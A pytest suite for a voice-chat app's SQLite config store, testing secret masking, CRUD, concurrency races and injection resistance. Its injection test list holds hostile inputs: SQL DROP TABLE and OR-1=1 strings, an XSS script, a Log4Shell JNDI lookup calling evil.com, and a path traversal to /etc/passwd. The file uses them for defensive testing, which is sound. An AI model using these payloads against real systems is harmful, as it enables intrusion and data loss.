"""
Tests for SQLite Config Store, CRUD operations, Secret Masking, and Security Controls.
Covers Tier 1 (Feature Coverage), Tier 2 (Boundary, Injection, Concurrency, and Secret Masking),
and Database CRUD operations on models & session.
"""

import os
import asyncio
import random
import sqlite3
import tempfile
import pydantic
import pytest
import aiosqlite

from galgame2voice.database.session import get_db, init_db
from galgame2voice.database.crud import (
    mask_api_key, is_masked_key,
    get_settings, get_settings_raw, update_settings, verify_console_token,
    list_providers, get_provider, get_provider_raw, get_active_provider, get_active_provider_raw,
    create_provider, update_provider, set_active_provider, delete_provider,
    list_voice_profiles, get_voice_profile, get_active_voice_profile,
    create_voice_profile, update_voice_profile, set_active_voice_profile, delete_voice_profile,
    get_or_create_session, get_session, list_sessions, delete_session, clear_session_messages,
    add_message, get_recent_messages, count_session_messages
)
from galgame2voice.database.models import (
    SettingsUpdate, ProviderCreate, ProviderUpdate,
    VoiceProfileCreate, VoiceProfileUpdate,
    SessionCreate, SessionUpdate,
    MessageCreate
)


def mask_secret(secret: str) -> str:
    """Helper to mask API keys and bot tokens (e.g. sk-****cdef)."""
    return mask_api_key(secret)


# ============================================================================
# Tier 1: Config Store & CRUD Primary Tests (Table-level & Schema)
# ============================================================================


# ============================================================================
# Tier 2: Boundary, Injection, Security, and Concurrency Tests
# ============================================================================

class TestConfigStoreTier2:
    """Tier 2: Edge cases, Secret Masking, SQL Injection, and Concurrency."""

    @pytest.mark.asyncio
    async def test_mask_secret_edge_cases(self):
        """Verifies mask_secret handles empty, short, and long keys safely."""
        assert mask_secret("") == ""
        assert mask_secret("short") == "********"
        assert mask_secret("12345678") == "********"
        assert mask_secret("sk-123456789") == "sk-****6789"


    @pytest.mark.asyncio
    async def test_voice_profile_unique_name_constraint(self, temp_db_path, sample_voice_profile):
        """Verifies inserting a voice profile with duplicate name raises sqlite3.IntegrityError."""
        async with aiosqlite.connect(temp_db_path) as db:
            await db.execute("""
                INSERT INTO voice_profiles (name, gpt_weights_path, sovits_weights_path, ref_audio_path, prompt_text)
                VALUES (?, ?, ?, ?, ?)
            """, (sample_voice_profile["name"], "w.ckpt", "w.pth", "r.wav", "text"))
            await db.commit()

            with pytest.raises(sqlite3.IntegrityError):
                await db.execute("""
                    INSERT INTO voice_profiles (name, gpt_weights_path, sovits_weights_path, ref_audio_path, prompt_text)
                    VALUES (?, ?, ?, ?, ?)
                """, (sample_voice_profile["name"], "w2.ckpt", "w2.pth", "r2.wav", "text2"))
                await db.commit()


# ============================================================================
# Tier 3: High-Level Async CRUD & Seed Persistence Verification
# ============================================================================

class TestConfigStoreCrud:
    """Tests for galgame2voice.database.crud functions and seed initialization."""

    @pytest.mark.asyncio
    async def test_settings_update_with_key_retention(self):
        """Verifies update_settings retains existing secrets when masked string is passed."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_file = f.name

        try:
            await init_db(db_file)
            async with get_db(db_file) as conn:
                await update_settings(conn, SettingsUpdate(console_token="sec-console-secret-token-1234567890"))
                raw = await get_settings_raw(conn)
                assert raw.console_token == "sec-console-secret-token-1234567890"

                masked_resp = await get_settings(conn, mask=True)
                assert is_masked_key(masked_resp.console_token)

                await update_settings(conn, SettingsUpdate(
                    speed_factor=1.25,
                    console_token=masked_resp.console_token,
                ))

                raw2 = await get_settings_raw(conn)
                assert raw2.speed_factor == 1.25
                assert raw2.console_token == "sec-console-secret-token-1234567890"

                assert await verify_console_token(conn, raw2.console_token) is True
                assert await verify_console_token(conn, "wrong-token") is False
        finally:
            if os.path.exists(db_file):
                os.remove(db_file)

    @pytest.mark.asyncio
    async def test_provider_crud_operations(self):
        """Verifies Provider CRUD, active provider switching, and masking retention."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_file = f.name

        try:
            await init_db(db_file)
            async with get_db(db_file) as conn:
                # Create custom provider
                new_p = await create_provider(conn, ProviderCreate(
                    id="my_llm",
                    name="My Custom LLM",
                    api_base_url="https://api.myllm.com/v1",
                    api_key="sk-secret1234567890abcdef",
                    chat_model="my-model-v1",
                    is_active=False
                ))
                assert new_p.id == "my_llm"
                assert new_p.api_key == "sk-****cdef"

                # Set active
                await set_active_provider(conn, "my_llm")
                active = await get_active_provider(conn)
                assert active.id == "my_llm"

                # Update model without changing masked key
                await update_provider(conn, "my_llm", ProviderUpdate(
                    chat_model="my-model-v2",
                    api_key="sk-****cdef"
                ))
                raw_p = await get_provider_raw(conn, "my_llm")
                assert raw_p.chat_model == "my-model-v2"
                assert raw_p.api_key == "sk-secret1234567890abcdef"

                # Delete
                assert await delete_provider(conn, "my_llm") is True
                assert await get_provider(conn, "my_llm") is None
        finally:
            if os.path.exists(db_file):
                os.remove(db_file)

    @pytest.mark.asyncio
    async def test_voice_profile_crud_operations(self):
        """Verifies Voice Profile CRUD and active profile switching."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_file = f.name

        try:
            await init_db(db_file)
            async with get_db(db_file) as conn:
                # Create
                created = await create_voice_profile(conn, VoiceProfileCreate(
                    name="Test Girl",
                    description="A test character",
                    gpt_weights_path="weights/test.ckpt",
                    sovits_weights_path="weights/test.pth",
                    ref_audio_path="ref/test.wav",
                    prompt_text="テストテキストです",
                    prompt_lang="ja",
                    text_lang="ja",
                    system_prompt="You are Test Girl"
                ))
                assert created.id == 1  # First user-created voice in a fresh DB.
                assert created.name == "Test Girl"

                # Switch active
                assert await set_active_voice_profile(conn, created.id) is True
                active = await get_active_voice_profile(conn)
                assert active.id == created.id

                # Update
                updated = await update_voice_profile(conn, created.id, VoiceProfileUpdate(description="Updated desc"))
                assert updated.description == "Updated desc"

                # Delete
                assert await delete_voice_profile(conn, created.id) is True
                assert await get_voice_profile(conn, created.id) is None
        finally:
            if os.path.exists(db_file):
                os.remove(db_file)

    @pytest.mark.asyncio
    async def test_session_and_message_history(self):
        """Verifies session auto-creation, message appending, sliding window query, and cleanup."""
        with tempfile.NamedTemporaryFile(suffix=".db", delete=False) as f:
            db_file = f.name

        try:
            await init_db(db_file)
            async with get_db(db_file) as conn:
                session_id = "web-sess-001"
                sess = await get_or_create_session(conn, session_id, channel="web")
                assert sess.id == session_id

                # Append 15 messages
                for i in range(15):
                    await add_message(conn, MessageCreate(
                        session_id=session_id,
                        role="user" if i % 2 == 0 else "assistant",
                        content_chinese=f"对话_{i}",
                        content_japanese=f"対話_{i}",
                        latency_ms=100 + i
                    ))

                assert await count_session_messages(conn, session_id) == 15

                # Query recent 10 messages (sliding window)
                recent = await get_recent_messages(conn, session_id, limit=10)
                assert len(recent) == 10
                # Should be chronological order (5 to 14)
                assert recent[0].content_chinese == "对话_5"
                assert recent[-1].content_chinese == "对话_14"

                # Clear messages
                assert await clear_session_messages(conn, session_id) is True
                assert await count_session_messages(conn, session_id) == 0

                # Delete session
                assert await delete_session(conn, session_id) is True
                assert await get_session(conn, session_id) is None
        finally:
            if os.path.exists(db_file):
                os.remove(db_file)


@pytest.fixture
async def adversarial_db(tmp_path):
    """Yields a clean initialized temporary SQLite database path."""
    path = str(tmp_path / "adversarial.db")
    await init_db(path)
    async with get_db(path) as conn:
        await create_voice_profile(conn, VoiceProfileCreate(
            name="Test voice", gpt_weights_path="test.ckpt", sovits_weights_path="test.pth",
            is_default=True,
        ))
    yield path
    if os.path.exists(path):
        try:
            os.remove(path)
        except OSError:
            pass


class TestConcurrencyAndStress:
    """Adversarial stress tests for concurrent access and race conditions."""

    @pytest.mark.asyncio
    async def test_high_concurrency_interleaved_crud(self, adversarial_db):
        """
        Stress test: 40 concurrent async workers executing simultaneous reads and writes
        across settings, providers, voice profiles, sessions, and messages.
        """
        async def worker_task(worker_id: int):
            async with get_db(adversarial_db) as conn:
                for i in range(10):
                    op = (worker_id + i) % 5
                    if op == 0:
                        # Update settings
                        await update_settings(conn, SettingsUpdate(
                            speed_factor=round(0.5 + (random.random() * 2.0), 2),
                            temperature=round(random.random(), 2)
                        ))
                    elif op == 1:
                        # Session and message operations with distinct session ids
                        sess_id = f"worker-sess-{worker_id}-{i}"
                        await get_or_create_session(conn, sess_id)
                        await add_message(conn, MessageCreate(
                            session_id=sess_id,
                            role="user" if i % 2 == 0 else "assistant",
                            content_chinese=f"并发测试消息_{worker_id}_{i}",
                            content_japanese=f"並行テストメッセージ_{worker_id}_{i}",
                            latency_ms=random.randint(50, 500)
                        ))
                    elif op == 2:
                        # Read active provider and settings
                        p = await get_active_provider(conn)
                        assert p is not None
                        s = await get_settings(conn)
                        assert s.active_provider_id is not None
                    elif op == 3:
                        # Read recent messages
                        sess_id = f"worker-sess-{worker_id}-{max(0, i-1)}"
                        msgs = await get_recent_messages(conn, sess_id, limit=5)
                        assert isinstance(msgs, list)
                    elif op == 4:
                        # Query voice profiles
                        profiles = await list_voice_profiles(conn)
                        assert len(profiles) >= 1

        # Spawn 40 concurrent workers (400 total operations)
        tasks = [worker_task(w) for w in range(40)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        for idx, res in enumerate(results):
            if isinstance(res, Exception):
                pytest.fail(f"Worker {idx} failed with exception: {res}")

        # Verify DB integrity after concurrent storm
        async with get_db(adversarial_db) as conn:
            s = await get_settings(conn)
            assert s is not None
            providers = await list_providers(conn)
            assert len(providers) == 10

    @pytest.mark.asyncio
    async def test_concurrent_session_creation_race(self, adversarial_db):
        """
        Race condition test: 25 concurrent tasks calling get_or_create_session for the SAME session_id.
        Exposes whether check-then-insert lacks concurrency protection (e.g. INSERT OR IGNORE).
        """
        target_session_id = "shared-race-session-999"

        async def create_task():
            async with get_db(adversarial_db) as conn:
                return await get_or_create_session(conn, target_session_id, channel="web")

        tasks = [create_task() for _ in range(25)]
        results = await asyncio.gather(*tasks, return_exceptions=True)

        exceptions = [res for res in results if isinstance(res, Exception)]
        if exceptions:
            pytest.fail(f"Concurrent get_or_create_session failed with {len(exceptions)} exceptions: {exceptions[0]}")

        for res in results:
            assert res.id == target_session_id

        # Verify exactly 1 session was created in DB
        async with get_db(adversarial_db) as conn:
            async with conn.execute("SELECT COUNT(*) FROM sessions WHERE id = ?", (target_session_id,)) as cursor:
                row = await cursor.fetchone()
                assert row[0] == 1

    @pytest.mark.asyncio
    async def test_concurrent_init_db_race(self):
        """
        Race condition test: Multiple concurrent workers running init_db on a fresh database file.
        Verifies whether table/seed creation handles concurrent first-start safely.
        """
        fd, path = tempfile.mkstemp(suffix=".db", prefix="adv_init_race_")
        os.close(fd)
        if os.path.exists(path):
            os.remove(path)

        try:
            tasks = [init_db(path) for _ in range(10)]
            results = await asyncio.gather(*tasks, return_exceptions=True)
            exceptions = [res for res in results if isinstance(res, Exception)]
            if exceptions:
                pytest.fail(f"Concurrent init_db failed with exception: {exceptions[0]}")

            async with get_db(path) as conn:
                profiles = await list_voice_profiles(conn)
                assert profiles == []  # First install awaits user voice setup.
                providers = await list_providers(conn)
                assert len(providers) == 10
        finally:
            if os.path.exists(path):
                os.remove(path)


class TestInjectionAndFuzzing:
    """Adversarial injection and extreme boundary tests."""

    INJECTION_PAYLOADS = [
        "'; DROP TABLE settings; --",
        "' OR '1'='1' --",
        "admin'--",
        "\" OR \"\"=\"",
        "<script>alert('xss')</script>",
        "{{7*7}}",
        "${jndi:ldap://evil.com/a}",
        "\x00\x01\x02\x03\x04\x05\x06\x07\x08",  # Control characters
        "👾👽🤖🧙‍♂️🌸💥🔥🌟",  # Complex emojis and unicode
        "SELECT * FROM providers WHERE 'a'='a';",
        "../../../etc/passwd",
        "\\" * 50,  # Repeated backslashes
        " " * 100,  # Whitespace padding
        "A" * 10000,  # 10KB string
    ]

    @pytest.mark.asyncio
    async def test_sql_injection_in_session_and_messages(self, adversarial_db):
        """Test SQL injection strings in session_id, user_id, channel, and message content."""
        async with get_db(adversarial_db) as conn:
            for idx, payload in enumerate(self.INJECTION_PAYLOADS):
                sess_id = f"sess_{idx}_{payload[:20]}"
                sess = await get_or_create_session(conn, session_id=sess_id, channel="web", user_id=payload[:30])
                assert sess.id == sess_id

                msg = await add_message(conn, MessageCreate(
                    session_id=sess_id,
                    role="user",
                    content_chinese=payload,
                    content_japanese=payload,
                    audio_url=f"/audio/{payload[:10]}.wav",
                    latency_ms=100
                ))
                assert msg.content_chinese == payload

                # Verify retrieval
                fetched_msgs = await get_recent_messages(conn, sess_id, limit=5)
                assert len(fetched_msgs) >= 1
                assert fetched_msgs[-1].content_chinese == payload

            # Verify tables still exist and were not dropped
            async with conn.execute("SELECT COUNT(*) FROM settings;") as cursor:
                row = await cursor.fetchone()
                assert row[0] == 1

    @pytest.mark.asyncio
    async def test_sql_injection_in_provider_crud(self, adversarial_db):
        """Test injection payloads in provider creation and updates."""
        async with get_db(adversarial_db) as conn:
            for idx, payload in enumerate(self.INJECTION_PAYLOADS):
                provider_id = f"adv_prov_{idx}"
                created = await create_provider(conn, ProviderCreate(
                    id=provider_id,
                    name=payload[:50],
                    api_base_url=f"https://api.example.com/{payload[:10]}",
                    api_key=f"sk-secret_{payload[:20]}",
                    chat_model=payload[:30],
                    custom_headers={"X-Custom": payload[:50]}
                ))
                assert created.id == provider_id

                # Query raw
                raw_p = await get_provider_raw(conn, provider_id)
                assert raw_p is not None
                assert raw_p.custom_headers == {"X-Custom": payload[:50]}

                # Delete
                deleted = await delete_provider(conn, provider_id)
                assert deleted is True


class TestDataIntegrityAndBoundaryDefense:
    """Tests boundary validation and non-existent entity handling."""

    @pytest.mark.asyncio
    async def test_set_active_provider_non_existent(self, adversarial_db):
        """
        Stress test: Calling set_active_provider with non-existent provider ID.
        Should return False or fail cleanly without unsetting active provider or corrupting state.
        """
        async with get_db(adversarial_db) as conn:
            # Check current active provider
            active_before = await get_active_provider(conn)
            assert active_before is not None

            # Attempt to set non-existent provider
            await set_active_provider(conn, "non_existent_provider_id_999")

            # Active provider should NOT be broken / None
            active_after = await get_active_provider(conn)
            assert active_after is not None, "set_active_provider with invalid ID broke active provider state!"

    @pytest.mark.asyncio
    async def test_settings_update_out_of_bounds_validation(self, adversarial_db):
        """
        Adversarial test: Submitting out-of-range values in SettingsUpdate.
        Checks if invalid DB updates cause permanent ValidationError bricking get_settings().
        """
        async with get_db(adversarial_db) as conn:
            # Try setting invalid speed_factor (e.g. 50.0 where max is 3.0)
            # If SettingsUpdate does not validate, it will write 50.0 to SQLite,
            # and then get_settings() will crash because SettingsResponse validates ge/le!
            try:
                await update_settings(conn, SettingsUpdate(speed_factor=50.0))
            except (pydantic.ValidationError, ValueError):
                pass  # Good, caught at update level

            # Database get_settings must not be bricked
            settings = await get_settings(conn)
            assert settings.speed_factor <= 3.0, "DB persisted out-of-bounds speed_factor!"
